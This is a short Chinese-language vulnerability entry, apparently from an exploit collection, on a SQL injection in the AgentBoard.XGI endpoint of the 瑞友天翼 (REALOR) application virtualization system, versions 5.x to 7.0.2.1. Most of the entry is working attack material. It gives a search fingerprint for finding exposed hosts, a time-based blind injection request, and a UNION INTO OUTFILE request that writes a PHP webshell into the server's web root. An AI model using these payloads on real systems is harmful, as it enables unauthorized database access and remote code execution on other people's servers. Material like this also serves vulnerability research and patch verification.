# 瑞友天翼应用虚拟化系统AgentBoard.XGISQL注入漏洞

- **系统**：瑞友天翼应用虚拟化系统AgentBoard.XGI　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="REALOR 瑞友天翼虚拟化平台"`
- **请求**：`GET /AgentBoard.XGI?user=1%27+AND+%28SELECT+8599+FROM+%28SELECT%28SLEEP%285%29%29%29ybrN%29+AND+%27NjRv%27%3D%27NjRv&cmd=UserLogin HTTP/1.1`

**请求体 / payload**
```
user参数存在SQL注入漏洞
/AgentBoard.XGI?user=1&cmd=UserLogin
Host: {hostname}
Cookie: PHPSESSID=h0r6todohj9kv8etikk8q7qb11; CookieLanguageName=ZH-CN

通过SQL注入漏洞写入webshell
GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-&cmd=UserLogin HTTP/1.1
Host: xx.xx.xx.xx
Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0

写入文件位置
http://xx.xx.xx.xx/2.php
```

**其他**
- 瑞友天翼应用虚拟化系统AgentBoard.XGI SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 5.x <= 瑞友天翼应用虚拟化系统 <= 7.0.2.1